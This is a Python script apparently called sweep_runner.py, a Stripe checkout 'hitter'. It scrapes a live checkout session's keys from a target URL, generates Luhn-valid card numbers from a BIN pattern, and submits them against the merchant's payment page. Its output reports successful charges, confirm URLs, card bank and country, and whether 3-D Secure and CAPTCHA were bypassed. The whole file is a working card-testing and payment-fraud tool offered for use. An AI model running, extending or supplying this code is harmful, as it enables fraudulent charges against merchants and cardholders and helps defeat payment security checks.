import sys
import json
import asyncio
import aiohttp

# Force UTF-8 output on Windows (cp1252 can't encode ─ ➜ ✅ ❌ 🔐)
if hasattr(sys.stdout, 'reconfigure'):
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')

from hitter_core import StripeAPIHitter, StripeAPIExtractor

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

def generate_luhn_cards(bin_prefix: str, count: int = 10):
    cards = []
    i = 100
    while len(cards) < count:
        body = f"{bin_prefix}{i:03d}"
        digits = [int(d) for d in body]
        total = 0
        for idx, d in enumerate(reversed(digits)):
            if idx % 2 == 0:
                doubled = d * 2
                total += doubled - 9 if doubled > 9 else doubled
            else:
                total += d
        check_digit = (10 - (total % 10)) % 10
        full_cc = f"{body}{check_digit}"
        cards.append(f"{full_cc}|05|2028|378")
        i += 7
    return cards

from hitter_core import CardGenerator

CARDS = []  # populated dynamically in main

async def run_single_card(url: str, card_str: str, index: int):
    parts = card_str.split("|")
    card_dict = {
        "card": parts[0],
        "mm": parts[1],
        "yy": parts[2],
        "cvv": parts[3]
    }
    
    clean_fetch_url = url.split("#")[0] if "#" in url else url
    async with aiohttp.ClientSession() as sess:
        hdr = {"User-Agent": UA, "Accept": "text/html,*/*"}
        async with sess.get(clean_fetch_url, headers=hdr, timeout=aiohttp.ClientTimeout(total=30)) as r:
            html = await r.text()
            final_url = str(r.url)


        cs_live = StripeAPIExtractor.extract_cs_live(final_url, html)
        pk_live = StripeAPIExtractor.extract_pk_live(html)

        hash_info = StripeAPIExtractor.extract_details_from_url_hash(url)
        hash_pk = hash_info.get('pk_key')
        stripe_account = hash_info.get('stripe_account')
        if hash_pk and hash_pk.startswith('pk_live_'):
            pk_live = hash_pk

        if not cs_live or not pk_live:
            print(f"[{index+1}/10] ERROR: Extraction failed cs={bool(cs_live)} pk={bool(pk_live)}")
            return None

        init_json = {}
        if cs_live.startswith('cs_'):
            try:
                init_url = f"https://api.stripe.com/v1/payment_pages/{cs_live}/init"
                init_data = f"key={pk_live}&eid=NA&browser_locale=en-US"
                if stripe_account:
                    init_data += f"&account={stripe_account}"
                hdr_init = {"Content-Type": "application/x-www-form-urlencoded", "User-Agent": UA}
                async with sess.post(init_url, data=init_data, headers=hdr_init, timeout=8) as ir:
                    init_json = await ir.json()
                    if not isinstance(init_json, dict):
                        init_json = {}
            except Exception:
                pass

        locked_email = None
        if init_json:
            locked_email = (
                init_json.get('customer_email')
                or init_json.get('prefilled_email')
                or init_json.get('email')
                or (init_json.get('customer') or {}).get('email')
                or (init_json.get('customer_details') or {}).get('email')
            )

        ts = init_json.get('total_summary') if init_json else None
        raw_amount = ts.get('total') if isinstance(ts, dict) else None
        if raw_amount is None and init_json:
            raw_amount = (
                (init_json.get('invoice') or {}).get('amount_due')
                or (init_json.get('payment_intent') or {}).get('amount')
            )

        striker = StripeAPIHitter(
            pk_live=pk_live,
            cs_live=cs_live,
            proxy_data=None,
            raw_amount=raw_amount,
            locked_email=locked_email,
            stripe_account=stripe_account,
            init_json=init_json,
            full_page_url=url,
        )

        res = await striker.hit(card_dict, attempt=1, user_id=0)

        # -- Live BIN lookup --
        from hitter_core import BINLookup
        bin_info   = await BINLookup.lookup(parts[0])

        success    = res.get('success', False)
        dec_code   = res.get('decline_code') or ''
        is_3ds     = dec_code in ('requires_action', 'waf_challenge', '3ds_challenge')
        merchant   = res.get('merchant') or 'Unknown'
        amount     = res.get('amount') or 'N/A'
        resp_time  = res.get('response_time', 0)
        bank       = bin_info.get('bank') or 'Unknown'
        country    = f"{bin_info.get('country_name', '')} ({bin_info.get('country', '??')})".strip(" ()")
        card_type  = bin_info.get('type') or 'Unknown'
        card_brand = bin_info.get('brand') or 'Unknown'
        card_level = bin_info.get('level') or ''

        # Pull decline message from Stripe raw response
        raw   = res.get('raw_response') or {}
        if isinstance(raw, str):
            try: raw = json.loads(raw)
            except Exception: raw = {}
        err_obj = raw.get('error') or {}
        msg = (
            err_obj.get('message')
            or res.get('message')
            or dec_code
            or 'No message'
        )

        # Pull raw internal diagnostic flags from result dictionary
        tds_attempted = res.get('3ds_attempted', False)
        tds_bypassed  = res.get('3ds_bypassed', False)
        tds_type      = res.get('3ds_type') or 'none'
        cap_bypassed  = res.get('captcha_bypassed', False)

        confirm_url = res.get('confirm_url') or res.get('receipt_url') or ''

        site_domain = res.get('site_domain')
        site_str = f"{merchant} ({site_domain})" if site_domain else merchant

        print("\nStripe Checkout Hitter\n")
        print(card_str)
        print(f"Site: {site_str}")
        print(f"Amount: {amount}")

        if success:
            print("Status: Payment sucessful  \u2705")
            print(f"Message: {amount} Charged!")
            if confirm_url:
                print(f"\nConfirmUrl: ({confirm_url})")
        else:
            print("Status: Payment declined  \u274c")
            print(f"Message: {msg}")

        # Real-time raw diagnostic JSON block
        diag_data = {
            "card": card_str,
            "merchant": merchant,
            "site_domain": site_domain,
            "status": "succeeded" if success else "declined",
            "decline_code": dec_code,
            "message": msg,
            "3ds_attempted": tds_attempted,
            "3ds_bypassed": tds_bypassed,
            "3ds_type": tds_type,
            "captcha_bypassed": cap_bypassed,
            "confirm_url": confirm_url if confirm_url else None,
            "raw_stripe_response": raw if isinstance(raw, dict) else str(raw)[:500]
        }
        print("\nDiagnostic JSON:")
        print(json.dumps(diag_data, indent=2))
        print("")


        return res



async def main():
    if len(sys.argv) < 2:
        print("Usage: python sweep_runner.py <url> [card_pattern]")
        return
    url = sys.argv[1]
    
    card_pattern = "415464440233xxxxx|05|28|378"
    if len(sys.argv) > 2:
        card_pattern = sys.argv[2]
        
    print(f"=== STARTING 10-CARD SWEEP ===")
    print(f"Target URL: {url[:80]}...")
    print(f"Card Pattern: {card_pattern}\n")
    
    # Generate 10 unique cards matching the requested pattern
    generated_cards = []
    for _ in range(10):
        c_data = CardGenerator.generate(card_pattern)
        if c_data:
            card_str = f"{c_data['card']}|{c_data['month']}|{c_data['year']}|{c_data['cvv']}"
            generated_cards.append(card_str)
            
    results = []
    for idx, card in enumerate(generated_cards):
        res = await run_single_card(url, card, idx)
        results.append(res)
        if res and isinstance(res, dict):
            dec_code = res.get("decline_code") or ""
            err_msg = str(res.get("error") or "").lower()
            if dec_code in ("checkout_not_active_session", "checkout_succeeded_session") or "no longer active" in err_msg or "already been processed" in err_msg:
                print("\n[!] FATAL: Stripe Checkout Session is expired or already completed. Terminating sweep.")
                break
        await asyncio.sleep(1) # clean 1s gap between hits

    print("\n=== SWEEP COMPLETED ===")

if __name__ == '__main__':
    asyncio.run(main())
